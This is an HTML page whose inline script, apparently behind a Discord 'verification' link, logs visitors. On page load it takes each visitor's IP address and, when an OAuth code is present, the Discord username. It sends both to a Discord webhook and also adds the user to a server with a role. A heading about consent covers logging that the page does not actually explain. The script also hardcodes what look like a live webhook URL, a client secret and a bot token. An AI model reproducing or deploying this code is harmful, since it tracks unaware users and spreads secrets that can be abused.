<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Logging Info...</title>
</head>
<body>
  <h1>Thank you for consenting. Logging information...</h1>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1365223944260554814/E4PX9F9VhRdjWhiE2prcWjsW1Z5wzSA7eTWYgDljpJXS-wSveRDrD9-iMNomw7eVJWZQ'; 
    const clientID = '1365713195850924114';      
    const clientSecret = '_z3zDmEIRLmZw8Q5b8SD-98S07TvrDNl'; 
    const redirectURI = 'https://dawahbrigades.github.io/verifyyy/';        
    const botToken = 'MTM2NTcxMzE5NTg1MDkyNDExNA.GJXbS6.PtHDOG3rWEbBXdTRz2X1UkuSG2x0XE8ZlRhIMg'; // <-- New: Your bot's token
    const guildID = '1364217751241097327'; // Your server ID
    const roleID = '1364261500293873716'; // The role you want to assign

    // 1. Fetch IP
    async function getIP() {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    }

    // 2. Send info to webhook
    async function sendToDiscord(ip, username) {
      const payload = {
        username: "Logger Bot",
        content: `**New User Logged!**\nIP Address: \`${ip}\`\nDiscord Username: **${username}**`
      };

      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    // 3. Exchange OAuth2 code for access token
    async function getDiscordUser(code) {
      const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: clientID,
          client_secret: clientSecret,
          grant_type: 'authorization_code',
          code: code,
          redirect_uri: redirectURI,
          scope: 'identify email guilds.join'
        })
      });

      const tokenData = await tokenResponse.json();
      return tokenData;
    }

    // 4. Get user info from Discord API
    async function fetchDiscordUsername(accessToken) {
      const userResponse = await fetch('https://discord.com/api/users/@me', {
        headers: {
          Authorization: `Bearer ${accessToken}`
        }
      });

      const userData = await userResponse.json();
      return userData;
    }

    // 5. Add member to guild + assign role
    async function addToGuild(userID, accessToken) {
      const response = await fetch(`https://discord.com/api/guilds/${guildID}/members/${userID}`, {
        method: 'PUT',
        headers: {
          'Authorization': `Bot ${botToken}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          access_token: accessToken,
          roles: [roleID]
        })
      });

      if (!response.ok) {
        const errorData = await response.json();
        console.error('Failed to add member or assign role:', errorData);
      }
    }

    // 6. Get URL param
    function getURLParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

    // 7. Start
    async function start() {
      const code = getURLParam('code');
      const ip = await getIP();
      let username = 'Unknown User';

      if (code) {
        const tokenData = await getDiscordUser(code);
        const accessToken = tokenData.access_token;

        if (accessToken) {
          const userData = await fetchDiscordUsername(accessToken);
          username = `${userData.username}#${userData.discriminator}`;

          await addToGuild(userData.id, accessToken); // ðŸš€ Add user and assign role
        }
      }

      await sendToDiscord(ip, username);
    }

    start();
  </script>
</body>
</html>
